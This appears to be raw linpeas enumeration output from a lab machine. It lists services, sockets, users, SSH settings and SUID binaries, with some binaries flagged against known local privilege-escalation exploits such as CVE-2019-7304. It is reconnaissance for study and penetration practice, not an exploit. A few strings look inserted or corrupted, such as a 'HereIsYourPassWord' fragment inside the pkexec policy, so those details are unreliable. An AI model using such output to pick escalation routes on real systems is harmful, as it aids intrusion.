╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                       
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                               
Sat 2023-11-11 22:59:02 UTC 3h 56min left Mon 2023-05-15 09:06:51 UTC 5 months 28 days ago apt-daily.timer              apt-daily.service             
Sat 2023-11-11 23:56:49 UTC 4h 54min left Mon 2023-05-15 08:57:55 UTC 5 months 28 days ago fwupd-refresh.timer          fwupd-refresh.service         
Sun 2023-11-12 00:00:00 UTC 4h 57min left Sat 2023-11-11 17:43:34 UTC 1h 18min ago         logrotate.timer              logrotate.service             
Sun 2023-11-12 00:00:00 UTC 4h 57min left Sat 2023-11-11 17:43:34 UTC 1h 18min ago         man-db.timer                 man-db.service                
Sun 2023-11-12 01:22:25 UTC 6h left       Sat 2023-11-11 18:44:26 UTC 18min ago            ua-timer.timer               ua-timer.service              
Sun 2023-11-12 03:10:00 UTC 8h left       Sat 2023-11-11 17:43:34 UTC 1h 18min ago         e2scrub_all.timer            e2scrub_all.service           
Sun 2023-11-12 03:42:34 UTC 8h left       Wed 2023-01-11 16:56:46 UTC 9 months 30 days ago motd-news.timer              motd-news.service             
Sun 2023-11-12 06:13:47 UTC 11h left      Sat 2023-11-11 18:21:06 UTC 41min ago            apt-daily-upgrade.timer      apt-daily-upgrade.service     
Sun 2023-11-12 17:58:36 UTC 22h left      Sat 2023-11-11 17:58:36 UTC 1h 3min ago          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2023-11-13 00:00:00 UTC 1 day 4h left Sat 2023-11-11 17:43:34 UTC 1h 18min ago         fstrim.timer                 fstrim.service                
n/a                         n/a           n/a                         n/a                  snapd.snap-repair.timer      snapd.snap-repair.service     

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                       
                                                                                                                                                                
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                      
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                     
/snap/core20/1778/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1778/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1778/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1778/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1778/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core20/1778/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core20/1778/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1778/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1778/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                      
/org/kernel/linux/storage/multipathd                                                                                                                            
/run/dbus/system_bus_socket
  └─(Read Write)
/run/irqbalance//irqbalance839.sock
  └─(Read )
/run/irqbalance/irqbalance839.sock
  └─(Read )
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/user/1001/bus
  └─(Read Write)
/run/user/1001/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1001/pk-debconf-socket
  └─(Read Write)
/run/user/1001/snapd-session-agent.socket
  └─(Read Write)
/run/user/1001/systemd/notify
  └─(Read Write)
/run/user/1001/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)
/var/snap/lxd/common/lxd/unix.socket

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                        
                                                                                                                                                                
╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                        
NAME                           PID PROCESS         USER            CONNECTION    UNIT                        SESSION DESCRIPTION                                
:1.0                           524 systemd-network systemd-network :1.0          systemd-networkd.service    -       -
:1.11                         1007 systemd-resolve systemd-resolve :1.11         systemd-resolved.service    -       -
:1.16                         1595 systemd         sau             :1.16         user@1001.service           -       -
:1.2                             1 systemd         root            :1.2          init.scope                  -       -
:1.22                         8811 busctl          sau             :1.22         session-10.scope            10      -
:1.3                           831 accounts-daemon[0m root            :1.3          accounts-daemon.service     -       -
:1.4                           841 polkitd         root            :1.4          polkit.service              -       -
:1.5                           846 udisksd         root            :1.5          udisks2.service             -       -
:1.6                           878 ModemManager    root            :1.6          ModemManager.service        -       -
:1.7                           845 systemd-logind  root            :1.7          systemd-logind.service      -       -
:1.8                           840 networkd-dispat root            :1.8          networkd-dispatcher.service -       -
:1.9                           844 snapd           root            :1.9          snapd.service               -       -
com.ubuntu.LanguageSelector      - -               -               (activatable) -                           -       -
com.ubuntu.SoftwareProperties    - -               -               (activatable) -                           -       -
org.freedesktop.Accounts       831 accounts-daemon[0m root            :1.3          accounts-daemon.service     -       -
org.freedesktop.DBus             1 systemd         root            -             init.scope                  -       -
org.freedesktop.ModemManager1  878 ModemManager    root            :1.6          ModemManager.service        -       -
org.freedesktop.PackageKit       - -               -               (activatable) -                           -       -
org.freedesktop.PolicyKit1     841 polkitd         root            :1.4          polkit.service              -       -
org.freedesktop.UDisks2        846 udisksd         root            :1.5          udisks2.service             -       -
org.freedesktop.bolt             - -               -               (activatable) -                           -       -
org.freedesktop.fwupd            - -               -               (activatable) -                           -       -
org.freedesktop.hostname1        - -               -               (activatable) -                           -       -
org.freedesktop.locale1          - -               -               (activatable) -                           -       -
org.freedesktop.login1         845 systemd-logind  root            :1.7          systemd-logind.service      -       -
org.freedesktop.network1       524 systemd-network systemd-network :1.0          systemd-networkd.service    -       -
org.freedesktop.resolve1      1007 systemd-resolve systemd-resolve :1.11         systemd-resolved.service    -       -
org.freedesktop.systemd1         1 systemd         root            :1.2          init.scope                  -       -
org.freedesktop.timedate1        - -               -               (activatable) -                           -       -
org.freedesktop.timesync1        - -               -               (activatable) -                           -       -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                             
                              ╚═════════════════════╝                                                                                                           
╔══════════╣ Hostname, hosts and DNS
pc                                                                                                                                                              
127.0.0.1 localhost pc

nameserver 127.0.0.53
options edns0 trust-ad

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                             
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.214  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:4b59  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:4b59  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:4b:59  txqueuelen 1000  (Ethernet)
        RX packets 233538  bytes 19991073 (19.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 104299  bytes 11478514 (11.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 111  bytes 8813 (8.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 111  bytes 8813 (8.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                              
                                                                                                                                                                


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                             
                               ╚═══════════════════╝                                                                                                            
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                        
uid=1001(sau) gid=1001(sau) groups=1001(sau)                                                                                                                    

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                    
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                
                                                                                                                                                                
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                
Sorry, try again.                                                                                                                                               

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                          
ptrace protection is enabled (1)                                                                                                                                

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                      
                                                                                                                                                                
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:aHereIsYourPassWord1431dmin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                 

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                 
sau:x:1001:1001::/home/sau:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                          
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1001(sau) gid=1001(sau) groups=1001(sau)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=110(landscape) Sandygid=115(landscape) groups=115(landscape)
uid=111(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=112(fwupd-refresh) gid=116(fwupd-refresh) groups=116(fwupd-refresh)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=997(_laurel) gid=997(_laurel) groups=997(_laurel)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)

╔══════════╣ Login now
 19:02:36 up  1:19,  1 user,  load average: 0.96, 0.22, 0.07                                                                                                    
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sau      pts/0    10.10.14.20      18:50   52.00s  0.22s  0.00s /bin/sh ./linpeas.sh

╔══════════╣ Last logons
reboot   system boot  Sat Nov 11 17:43:27 2023   still running                         0.0.0.0                                                                  
root     pts/0        Mon May 15 09:01:48 2023 - down                      (00:07)     10.10.14.19
root     pts/0        Mon May 15 09:01:27 2023 - Mon May 15 09:01:35 2023  (00:00)     10.10.14.19
sau      pts/0        Mon May 15 09:00:44 2023 - Mon May 15 09:01:19 2023  (00:00)     10.10.14.19
reboot   system boot  Mon May 15 08:21:29 2023 - Mon May 15 09:09:34 2023  (00:48)     0.0.0.0
sau      pts/0        Thu Apr 27 15:36:14 2023 - Thu Apr 27 15:39:10 2023  (00:02)     10.10.14.40
root     tty1         Thu Apr 27 15:30:38 2023 - down                      (00:08)     0.0.0.0
reboot   system boot  Thu Apr 27 15:30:08 2023 - Thu Apr 27 15:39:12 2023  (00:09)     0.0.0.0

wtmp begins Thu Apr 27 15:30:08 2023

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                               
root             pts/0    10.10.14.19      Mon May 15 09:01:48 +0000 2023
sau              pts/0    10.10.14.20      Sat Nov 11 18:50:32 +0000 2023

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                              
                             ╚══════════════════════╝                                                                                                           
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                 
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/snap/bin/lxc
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                             4:9.3.0-1ubuntu2                  amd64        GNU C++ compiler                                                             
ii  g++-9                           9.4.0-1ubuntu1~20.04.1            amd64        GNU C++ compiler
ii  gcc                             4:9.3.0-1ubuntu2                  amd64        GNU C compiler
ii  gcc-9                           9.4.0-1ubuntu1~20.04.1            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                
╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Aug 16  2022 /usr/share/doc/rsync/examples/rsyncd.conf                                                                              
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                            
drwxr-xr-x 2 root root 4096 Jan 10  2023 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                     
                                                                                                                                                                




-rw-r--r-- 1 root root 607 Jan 11  2023 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 179 Jan 11  2023 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 99 Jan 11  2023 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 571 Jan 11  2023 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/pki/fwupd-metadata/LVFS-CA.pem                                                                                                                             
/etc/pki/fwupd/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
1735PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket                                                                                                 
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                  
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 May 15 09:06 /etc/pam.d                                                                                                             
-rw-r--r-- 1 root root 2133 Mar 30  2022 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                          
tmux 3.0a                                                                                                                                                       


/tmp/tmux-1001
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3786 Dec  8  2022 /snap/core20/1778/etc/cloud/cloud.cfg                                                                                  
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 200 Dec 12  2022 /snap/core20/1778/usr/share/keyrings                                                                                    
drwxr-xr-x 2 root root 4096 Apr 27  2023 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                  
passwd file: /etc/passwd
passwd file: /snap/core20/1778/etc/pam.d/passwd
passwd file: /snap/core20/1778/etc/passwd
passwd file: /snap/core20/1778/usr/share/bash-completion/completions/passwd
passwd file: /snap/core20/1778/usr/share/lintian/overrides/passwd
passwd file: /snap/core20/1778/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                    
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                
                                                                                                                                                                
-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /snap/core20/1778/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /snap/core20/1778/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /snap/core20/1778/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core20/1778/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /snap/core20/1778/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2247 Apr  5  2023 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Apr  5  2023 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Apr  5  2023 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Apr  5  2023 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Apr  5  2023 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 2250 Apr  5  2023 /usr/share/keyrings/ubuntu-advantage-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Apr  5  2023 /usr/share/keyrings/ubuntu-advantage-ros.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg


╔══════════╣ Analyzing Cache Vi Files (limit 70)
                                                                                                                                                                
lrwxrwxrwx 1 root root 9 Jan 11  2023 /home/sau/.viminfo -> /dev/null


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1778/usr/share/bash-completion/completions/postfix                                                         

-rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind                                                                             
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc                                                                                                      
-rw-r--r-- 1 sau sau 3771 Feb 25  2020 /home/sau/.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1778/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 sau sau 807 Feb 25  2020 /home/sau/.profile
-rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1778/etc/skel/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                              
                      ╚════════════════════════════════════╝                                                                                                    
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                
-rwsr-xr-x 1 root root 121K Dec  1  2022 /snap/snapd/17950/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                                                                                                             
-rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1778/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1778/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1778/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1778/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1778/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1778/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                                                         
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1778/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1778/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1778/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1778/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1778/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 463K Apr  3  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 144K Dec  1  2022 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 67K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 84K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 52K Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Nov 29  2022 /usr/bin/gpasswd

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1778/usr/bin/chage                                                                                       
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1778/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1778/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1778/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1778/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /snap/core20/1778/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
